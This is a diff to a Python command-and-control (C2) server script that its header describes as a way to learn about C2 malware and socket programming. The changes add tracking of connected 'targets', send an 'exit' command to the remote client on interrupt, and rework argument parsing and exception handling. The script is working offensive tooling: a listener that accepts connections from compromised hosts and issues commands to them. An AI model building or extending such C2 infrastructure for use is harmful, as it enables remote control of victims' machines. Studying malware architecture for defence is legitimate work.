@@ -8,9 +8,9 @@
 #                   understanding of C2 malware and a further understanding of Python 
 #                   Socket applications.
 # Theme Song:   https://www.youtube.com/watch?v=3abZal0fXCU&ab_channel=MichaelWyckoff
-# Changelog:    Added command-line arguments for IP and PORT
-#               Split sections of handler() into subfunctions
-#               Added fancy new banner
+# Changelog:    Moved some exception handling into __main__
+#               Revised exception handling
+#               Added list of data on connected targets for future use
 ###########################################################################################
 
 import socket
@@ -40,6 +40,8 @@ def listener_handler():
     print('[+] Awaiting Connection from Client...')
     sock.listen()
     remote_target, remote_ip = sock.accept()
+    targets.append([remote_target, remote_ip])
+
     comm_handler(remote_target, remote_ip)
 
 def comm_handler(remote_target, remote_ip):
@@ -63,17 +65,25 @@ def comm_handler(remote_target, remote_ip):
                 break
 
         except KeyboardInterrupt:
+            remote_target.send('exit'.encode())
             remote_target.close()
             print('\n[-] Interrupt issued, program exit.')
             break
 
-        except Exception:
-            remote_target.close()
-            break
+        #except Exception:
+        #    remote_target.close()
+        #    break
 
 if __name__ == '__main__':
+    targets = []
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host_ip = sys.argv[1]
-    host_port = int(sys.argv[2])
-    banner()
-    listener_handler()
+
+    try:
+        host_ip = sys.argv[1]
+        host_port = int(sys.argv[2])
+        banner()
+        listener_handler()
+    except IndexError:
+        print('[-] Command line arguments are missing. Please try again.')
+    except Exception as e:
+        print(e)
